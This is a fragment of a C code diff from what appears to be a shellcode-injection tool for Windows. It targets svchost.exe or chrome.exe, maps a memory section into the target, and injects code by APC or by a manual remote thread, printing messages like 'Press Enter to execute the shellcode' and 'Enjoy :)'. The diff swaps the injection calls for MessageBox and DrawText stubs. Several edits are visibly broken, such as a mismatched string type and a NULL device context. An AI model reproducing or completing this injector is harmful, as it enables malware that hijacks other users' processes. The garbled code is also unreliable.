 		// If not found, try to open chrome.exe
-		printf("[!] No openable svchost.exe found. Trying chrome.exe...\n");
+		printf("[!] No openable chrome.exe found. Trying chrome.exe...\n");
 		hProcess = GiveMeMyProcessHandle(L"chrome.exe", &PID);
 	}
 
@@ -378,26 +691,28 @@ int main() {
 		return -1;
 	}
 
-	if (!SettingMap(&hSection, &pBaseSection, hProcess)) {
-		printf("Failed to create map\n");
-	}
-	else if (pBaseSection != NULL && pBaseSection != 0) {
+	MessageBoxA(NULL, "Thanks !", "HIHI", MB_OK);
+	if (pBaseSection != NULL && pBaseSection != 0) {
 		printf("[+] Setup of the map successful at 0x%p\n", pBaseSection);
 	}
 	else {
 		printf("Failed to create map\n");
 	}
-
+	printf("Getchar DR0\n");
 	// Getting a thread from the remote process
 	printf("[i] Press Enter to execute the shellcode\n");
-	getchar();
-	if (!QueueShellcodeAPC((DWORD)PID, pBaseSection)) {
+	if (!MessageBoxW(NULL, L"test", "Never exec", MB_OK)) { // QueueShellcodeAPC((DWORD)PID, pBaseSection)
 		printf("[i] Trying to inject a thread manually\n");
-		if (!InjectShellcodeAPCmanually(hProcess, pBaseSection)) {
-			printf("Failed to inject remote thread manually\n");
+		printf("Getchar DR1\n");
+		RECT rc = { 10, 10, 200, 50 };
+		HDC hdc = NULL;
+		if (!DrawTextA(hdc, "Hello World", -1, &rc, DT_CENTER | DT_VCENTER | DT_SINGLELINE)) { // !InjectShellcodeAPCmanually(hProcess, pBaseSection)
+			printf("Failed to inject local thread manually\n");
 		}
 		else {
 			printf("Enjoy :)\n");
+			printf("Getchar DR2: %d\n", GetLastError());
+			getchar();
 		}
 	}
 	else {
